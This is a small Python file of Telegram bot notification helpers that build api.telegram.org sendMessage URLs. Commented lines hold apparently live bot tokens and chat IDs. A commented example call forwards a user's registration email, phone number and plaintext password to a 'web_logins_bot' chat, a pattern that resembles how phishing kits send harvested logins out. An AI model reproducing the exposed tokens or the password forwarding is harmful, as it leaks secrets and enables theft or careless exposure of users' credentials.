import requests


# login_id = '1907528152:AAFKUHxZAUH64cbNPvlw3OPL2vocRTg0e7g'
# contact_id = '1982382068:AAHOtbNTtSVKs-cFQ5IuKGC5Xixjx672ZT4'
# greg = 1913121780
# yusuf = 1799480324
# dan = 1913121780

# web_logins_bot = '2050752630:AAEOGwpb9k0KBdT8qF0EUhnbLlexMjx9PzY'
# web_login_page = '-621761649'
#
# general_group = 'peektopmobiletd'
# support = 'top_support1'
# bot_id = '2025605793:AAEjftnjpSZn7vo4kDZ1nPahqguGimdndyE'

def notifications(bot_message, bot, id):
    bot_token = bot
    bot_chatID = id
    send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
    response = requests.get(send_text)
    return response.json()

def alert_group_notification(message, bot_id, group):

    send_text = 'https://api.telegram.org/bot'+bot_id+'/sendMessage?chat_id=@'+group+'&&text='+message
    response = requests.get(send_text)
    return response.json()

def web_login(message, bot_id, group):

    send_text = 'https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}'.format(bot_id, group, message)
    response = requests.get(send_text)
    # print(response.text)
    return response.json()

# web_login('Registration\n'
#           'email: {}\n'
#           'Phone: {}\n'
#           'Password: {}\n', web_logins_bot, web_login_page)
# alert_group_notification(general_group, bot_id, 'Hello')

    # notifications('test', contact_id, str(dan))